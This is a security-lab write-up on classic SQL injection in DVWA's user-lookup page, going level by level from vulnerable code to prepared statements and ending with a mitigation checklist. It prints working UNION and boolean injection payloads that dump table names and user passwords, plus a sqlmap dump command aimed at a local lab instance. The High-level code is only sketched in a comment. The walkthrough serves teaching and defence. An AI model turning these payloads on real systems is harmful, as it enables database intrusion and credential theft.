# 07 — SQL Injection (Classic / In-Band)

## What the feature does
A "look up user by ID" form that returns the user's first/surname from the `users` table.

---

## LOW

```php
$id = $_REQUEST[ 'id' ];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
$result = mysqli_query($GLOBALS["___mysqli_ston"], $query);
```

**Exploitation — authentication/logic bypass and data extraction:**

```sql
-- Boolean-based bypass
1' OR '1'='1

-- UNION-based extraction (find column count first)
1' ORDER BY 2-- -
1' ORDER BY 3-- -   (errors out → table has 2 columns)

-- Dump DB metadata
1' UNION SELECT table_name, NULL FROM information_schema.tables-- -
1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'-- -

-- Dump credentials
1' UNION SELECT user, password FROM users-- -
```

**Automated (sqlmap):**
```bash
sqlmap -u "http://127.0.0.1:42001/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" \
  --cookie="PHPSESSID=<id>; security=low" \
  --dbms=mysql --dump -T users
```

**Why it works:** User input is concatenated directly into the SQL query string. The database cannot distinguish "data" from "code" — a `'` in the input closes the intended string literal early, letting everything after it be interpreted as SQL syntax.

---

## MEDIUM

```php
$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $_REQUEST[ 'id' ]);
$query = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
```

Also switches the input field to a `<select>` dropdown in the UI (not a free-text box) — but that's cosmetic; the HTTP request underneath is still fully attacker-controlled.

**Why it's still bypassable:** `mysqli_real_escape_string()` escapes quote characters, which stops **string-context** injection — but the query here uses the ID **unquoted** (`user_id = $id`, no surrounding `'...'`). Escaping quotes does nothing to protect a numeric/unquoted context, since no quote needs to be broken out of:

```
# Since the select dropdown is a UI restriction, not a server one:
id=1 UNION SELECT user, password FROM users-- -
```
Submitted directly (via Burp, bypassing the dropdown), this works identically to Low, because the escaping function was solving the wrong problem for this query shape.

**Root issue:** Escaping is context-dependent and easy to misapply; it does not protect numeric/unquoted SQL contexts, and client-side UI restrictions (dropdown) provide zero server-side security.

---

## HIGH

```php
$id = $_SESSION['id'];  // taken from session, set once via a hidden field workflow
// still built via string concatenation with escaping, similar pattern to medium,
// wrapped in a session-tracking flow (multi-request "id" flow) intended to limit reuse
```

DVWA's High level mainly adds a `LIMIT 1` and moves the ID into a session-tracked flow to reduce trivial UNION-based dumping in one shot, and still uses escaping rather than parameterization.

**Why it's still bypassable:** The core query construction is still string concatenation with escaping (not parameterized), so classic UNION-based injection through the `id` parameter still works once you locate where the value is read from (the session is still seeded by an earlier request the attacker controls, e.g. `id=1' UNION SELECT user, password FROM users-- -` submitted at the point the session value is set). This models a very common real-world gap: **defenses added at the wrong layer** (session/flow control) instead of fixing the query construction itself.

**Root issue:** Escaping ≠ parameterization; restructuring the *flow* around a vulnerable query doesn't fix the query.

---

## IMPOSSIBLE

```php
$id = $_GET[ 'id' ];
$stmt = $GLOBALS["___mysqli_ston"]->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (?) AND user_id = (?) LIMIT 1;' );
$stmt->bind_param( 'ss', $id, $id );
$stmt->execute();
```

**Why this is actually secure:** This uses a **parameterized/prepared statement**. The SQL query structure is compiled and sent to the database *first*, with placeholders (`?`). The user's input is then sent **separately, as data**, and bound into those placeholders — the database driver never re-parses the input as part of the SQL grammar. There is no way for a `'`, `UNION`, `--`, or any SQL syntax in the input to change the query's structure, because by the time the input arrives, the query structure is already fixed. This is the industry-standard, complete fix for SQL injection — not "better escaping," but eliminating string concatenation of untrusted input into SQL entirely.

---

## Root Cause Summary
> SQL injection exists whenever untrusted input is concatenated into a query string. Escaping helps in specific contexts but is fragile and easy to misapply (e.g. unquoted numeric contexts). The only complete fix is parameterized queries / prepared statements, which separate code from data at the protocol level.

## Real-World Parallels
- Consistently in the OWASP Top 10: **A03:2021 – Injection**
- Countless real breaches: Heartland Payment Systems, Sony Pictures, TalkTalk — all involved SQL injection
- One of the most commonly reported (and highest paying) bug bounty vulnerability classes when found in production auth/data endpoints

## Mitigation Checklist
- [ ] Use parameterized queries / prepared statements everywhere — no exceptions for "just this one field"
- [ ] Use an ORM with proper parameter binding as an additional layer
- [ ] Least-privilege DB account for the web app (no `DROP`/`FILE` privileges if not needed)
- [ ] Disable verbose SQL error messages in production (prevents error-based injection reconnaissance)
- [ ] WAF as defense-in-depth only, never as the primary control
